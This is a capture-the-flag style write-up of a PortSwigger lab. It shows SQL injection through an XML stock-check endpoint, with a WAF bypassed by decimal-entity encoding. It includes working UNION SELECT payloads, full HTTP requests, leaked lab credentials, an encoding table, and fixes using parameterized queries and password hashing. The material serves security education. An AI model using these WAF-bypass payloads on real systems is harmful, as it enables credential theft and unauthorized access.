# PortSwigger — SQL Injection with Filter Bypass via XML Encoding

`Web Security Academy` • `SQL Injection` • `Practitioner`

## TL;DR

A stock check feature passes user-supplied XML data into a SQL query. A WAF blocks standard SQL keywords like `UNION SELECT`. Encoding the payload using decimal HTML entities (`&#85;&#78;...`) bypasses the WAF — the XML parser decodes the entities before the query reaches the database, making the injection fully transparent to the backend while remaining invisible to the filter.

**Lab URL:** `https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding`

---

## Challenge Description

> This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.
>
> The database contains a `users` table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.

**Context:**
- Difficulty: **Practitioner**
- Category: **SQL Injection**
- Goal: Extract credentials from the `users` table and log in as `administrator`
- Defense in place: **WAF (Web Application Firewall)** blocking SQL keywords

---

## Recon

### Step 1 — Identify the attack surface

Browsing the application, each product page has a **"Check stock"** feature. Using **Burp Suite Proxy**, we intercept the outgoing request when clicking "Check stock":

```http
POST /product/stock HTTP/2
Host: <lab-id>.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>2</productId>
    <storeId>1</storeId>
</stockCheck>
```

**Key observations:**
- The request body is **XML** — not a standard form or JSON payload
- The `storeId` parameter is a numeric value passed directly to the backend
- The response returns a stock count — meaning **query results are reflected** in the response → UNION attack is viable

### Step 2 — Confirm the injection point

Sending the request to **Burp Repeater** and modifying `storeId` with a raw SQL payload:

```xml
<storeId>1 UNION SELECT NULL</storeId>
```

**Response:**
```http
HTTP/2 403 Forbidden
"Attack detected"
```

A WAF is actively blocking SQL keywords. Standard injection payloads are detected and rejected.

---

## Exploitation

### Step 3 — Bypass the WAF with XML entity encoding

The WAF inspects the raw request body for SQL keywords. However, **XML parsers decode entities before passing values to the application**. If we encode the SQL keywords as decimal HTML entities, the WAF sees gibberish while the backend receives valid SQL.

Using **Burp Suite's Hackvertor extension**:
1. Select the SQL payload text in Repeater
2. Right-click → Extensions → Hackvertor → Encode → `dec_entities`

The payload `UNION SELECT username||'~'||password FROM users` becomes wrapped in Hackvertor tags:

```xml
<storeId>1 <@dec_entities>UNION SELECT username||'~'||password FROM users</@dec_entities></storeId>
```

Hackvertor sends the request with the payload fully encoded as decimal entities — invisible to the WAF, but decoded correctly by the XML parser before reaching the SQL engine.

### Step 4 — Analyze the full injected query

The application's backend SQL query (before injection) is approximately:

```sql
SELECT stock FROM products WHERE storeId = 1
```

After injection, the decoded query becomes:

```sql
SELECT stock FROM products WHERE storeId = 1
UNION SELECT username||'~'||password FROM users
```

| Fragment | Role |
|---|---|
| `1` | Valid original storeId — first SELECT returns a normal row |
| `UNION SELECT` | Appends a second result set from a different table |
| `username\|\|'~'\|\|password` | Concatenates username and password with `~` as separator into a single column |
| `FROM users` | Targets the known `users` table |

The `||` operator is PostgreSQL string concatenation — confirming the backend is **PostgreSQL**.

### Step 5 — Send the payload and retrieve credentials

**Request:**

```http
POST /product/stock HTTP/2
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>2</productId>
    <storeId>1 <@dec_entities>UNION SELECT username||'~'||password FROM users</@dec_entities></storeId>
</stockCheck>
```

**Response:**

```http
HTTP/2 200 OK

carlos~nc0o69lqdxmq1hgtfm2m
administrator~tvxh9ynqyhhkohkou2ay
423 units
wiener~zx60fifvj2536fbsoop0
```

The entire `users` table is leaked — all three accounts with their plaintext passwords.

### Step 6 — Authenticate as administrator

Navigating to `/login`:
- **Username:** `administrator`
- **Password:** `tvxh9ynqyhhkohkou2ay`

```
✅ Congratulations, you solved the lab!
```

---

## Attack Chain Summary

```
Browse product page → click "Check stock"
        ↓
Burp Proxy intercepts POST /product/stock (XML body)
        ↓
Send to Repeater → test: storeId = 1 UNION SELECT NULL
        ↓
HTTP 403 "Attack detected" → WAF confirmed
        ↓
Encode payload with Hackvertor → dec_entities
        ↓
WAF sees encoded gibberish → passes through
XML parser decodes entities → SQL engine receives valid UNION SELECT
        ↓
Response leaks full users table:
administrator~tvxh9ynqyhhkohkou2ay
        ↓
Login as administrator → LAB SOLVED ✅
```

---

## How XML Entity Encoding Bypasses the WAF

This is the core trick of the lab — worth understanding in detail.

The WAF performs **pattern matching on the raw request body**. It looks for strings like `UNION`, `SELECT`, `FROM`, etc.

When encoded as decimal entities:

| Original | Decimal Entity |
|---|---|
| `U` | `&#85;` |
| `N` | `&#78;` |
| `I` | `&#73;` |
| `O` | `&#79;` |
| `S` | `&#83;` |
| `E` | `&#69;` |
| `L` | `&#76;` |
| `C` | `&#67;` |
| `T` | `&#84;` |
| `\|` | `&#124;` |
| `'` | `&#39;` |
| `F` | `&#70;` |
| `R` | `&#82;` |
| `M` | `&#77;` |

The WAF sees `&#85;&#78;&#73;&#79;&#78;` and finds no match for `UNION`. It forwards the request.

The **XML parser** then decodes the entities back to `UNION SELECT username||'~'||password FROM users` before handing the value to the SQL layer. The database receives fully valid SQL.

```
Raw request  →  WAF (sees encoded text → no match → allow)
                    ↓
             XML Parser (decodes entities → plain SQL)
                    ↓
             SQL Engine (executes UNION SELECT → returns data)
```

---

## Impact & Mitigation

### Real-World Implications

| Vulnerability | Reference |
|---|---|
| **CWE-89** | Improper Neutralization of Special Elements in a SQL Command |
| **CWE-116** | Improper Encoding or Escaping of Output |
| **OWASP A03:2021** | Injection |
| **CVSSv3** | 9.8 Critical (full database read, no authentication required) |

**Why this is critical:**

- The WAF gives a **false sense of security** — it is trivially bypassed with encoding
- Full contents of the `users` table are exfiltrated in a single request
- Credentials are stored in **plaintext** — no hashing — making them immediately usable
- Any XML-based endpoint is a potential injection surface, not just login forms

**Real-world attack scenarios:**
1. **Full credential dump**: Extract all usernames and passwords from the database in one shot
2. **Credential stuffing**: Use the leaked passwords against other services (password reuse)
3. **WAF bypass as a generic technique**: XML encoding, Unicode normalization, HTTP parameter pollution — WAFs are bypassable; they are not a substitute for secure code
4. **Lateral movement**: Database credentials in config files accessible via SQLi can pivot to the underlying server

---

### Secure Code Fix

**❌ Vulnerable code — user input concatenated into SQL:**
```python
store_id = request.xml_body['storeId']
query = f"SELECT stock FROM products WHERE storeId = {store_id}"
db.execute(query)
```

**✅ Fixed with Parameterized Query:**
```python
store_id = request.xml_body['storeId']
query = "SELECT stock FROM products WHERE storeId = ?"
db.execute(query, (store_id,))
```

**✅ Fixed with input type validation:**
```python
store_id = request.xml_body['storeId']

# storeId should always be an integer — reject anything else before querying
if not str(store_id).isdigit():
    return Response("Invalid input", status=400)

query = "SELECT stock FROM products WHERE storeId = ?"
db.execute(query, (int(store_id),))
```

**✅ Hash passwords properly:**
```python
# Never store plaintext passwords
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
```

**Best Practices:**
1. **Parameterized queries** — the only reliable SQLi defense; encoding/WAF rules are bypassable
2. **WAFs are a secondary layer**, not a primary defense — never rely on them alone
3. **Hash passwords** with `bcrypt` or `argon2` — plaintext storage turns a SQLi into an instant full credential breach
4. **Validate and type-check inputs** — a numeric `storeId` should be rejected if it contains anything other than digits
5. **Apply Principle of Least Privilege** — the DB account used by the app should only be able to `SELECT` on the tables it needs, nothing more

---

## Key Takeaways

**Technical Skills:**
- Identified a SQL injection point inside an XML request body using Burp Suite Proxy and Repeater
- Confirmed WAF presence via `403 "Attack detected"` response on raw SQL keywords
- Used **Burp Suite Hackvertor** extension to encode the payload as decimal HTML entities
- Performed a **UNION-based injection** to extract all rows from the `users` table
- Used PostgreSQL string concatenation (`||`) to collapse two columns into one

**Security Concepts:**
- WAFs perform **surface-level pattern matching** — any encoding that the application layer decodes transparently can bypass them
- XML parsers decode entities **before** the application processes the value — this is by design and cannot be disabled
- Defense-in-depth requires **parameterized queries at the code level**, not just a WAF at the network level
- Plaintext password storage combined with SQLi is a critical compound vulnerability — each issue multiplies the impact of the other

---

## Tools Used

| Tool | Purpose |
|---|---|
| **Burp Suite Community** | Proxy, Repeater — intercept and replay HTTP requests |
| **Hackvertor (BApp Store)** | Encode payload as decimal entities to bypass WAF |

---

## References

- [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PortSwigger — SQL Injection UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [PortSwigger — Hackvertor Extension](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100)
- [OWASP — SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [OWASP Top 10 2021 — A03 Injection](https://owasp.org/Top10/A03_2021-Injection/)